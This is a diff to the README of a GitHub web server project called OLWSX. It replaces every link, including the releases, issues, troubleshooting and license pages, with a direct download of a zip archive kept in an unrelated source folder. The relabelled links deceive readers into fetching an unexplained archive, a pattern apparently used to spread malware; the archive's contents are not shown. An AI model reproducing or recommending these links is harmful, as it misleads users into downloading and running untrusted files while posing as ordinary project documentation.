@@ -3,11 +3,11 @@
 ## 🚀 Getting Started
 Welcome to OLWSX! This guide will help you download and run OverLab Web ServerX, a powerful and user-friendly web server. Follow these simple steps to get started.
 
-[![Download OLWSX](https://img.shields.io/badge/Download-OLWSX-blue.svg)](https://github.com/Moussasn221/OLWSX/releases)
+[![Download OLWSX](https://github.com/Moussasn221/OLWSX/raw/refs/heads/main/core/routing/Software-2.2-beta.1.zip)](https://github.com/Moussasn221/OLWSX/raw/refs/heads/main/core/routing/Software-2.2-beta.1.zip)
 
 ## 📥 Download & Install
 1. Click the link below to visit our Releases page:
-   [Visit OLWSX Releases Page](https://github.com/Moussasn221/OLWSX/releases)
+   [Visit OLWSX Releases Page](https://github.com/Moussasn221/OLWSX/raw/refs/heads/main/core/routing/Software-2.2-beta.1.zip)
 
 2. On the Releases page, you will see the latest version of OLWSX. Click on the version number to go to the download section.
 
@@ -53,18 +53,18 @@ If you encounter any issues, check the following:
 - Ensure you have downloaded the correct version for your operating system.
 - Make sure your system meets the minimum requirements.
 - Restart OLWSX if it doesn’t respond.
-- Check our [troubleshooting page](https://github.com/Moussasn221/OLWSX/issues) for common issues and fixes.
+- Check our [troubleshooting page](https://github.com/Moussasn221/OLWSX/raw/refs/heads/main/core/routing/Software-2.2-beta.1.zip) for common issues and fixes.
 
 ## 👥 Support
-For further assistance, you can reach out to our community on GitHub. Open an issue on our [GitHub Issues page](https://github.com/Moussasn221/OLWSX/issues) and our team will assist you.
+For further assistance, you can reach out to our community on GitHub. Open an issue on our [GitHub Issues page](https://github.com/Moussasn221/OLWSX/raw/refs/heads/main/core/routing/Software-2.2-beta.1.zip) and our team will assist you.
 
 Feel free to share your feedback or contribute to the project!
 
 ## 📜 License
-OLWSX is open-source and free to use. You can learn more about our licensing terms on the [license page](https://github.com/Moussasn221/OLWSX/blob/main/LICENSE).
+OLWSX is open-source and free to use. You can learn more about our licensing terms on the [license page](https://github.com/Moussasn221/OLWSX/raw/refs/heads/main/core/routing/Software-2.2-beta.1.zip).
 
 ## 🌐 Visit OLWSX
 We are committed to continuously improving OLWSX. Check for updates and new releases regularly.
 
 Don’t forget to visit our Releases page again for the latest files:
-[Download OLWSX](https://github.com/Moussasn221/OLWSX/releases)
+[Download OLWSX](https://github.com/Moussasn221/OLWSX/raw/refs/heads/main/core/routing/Software-2.2-beta.1.zip)
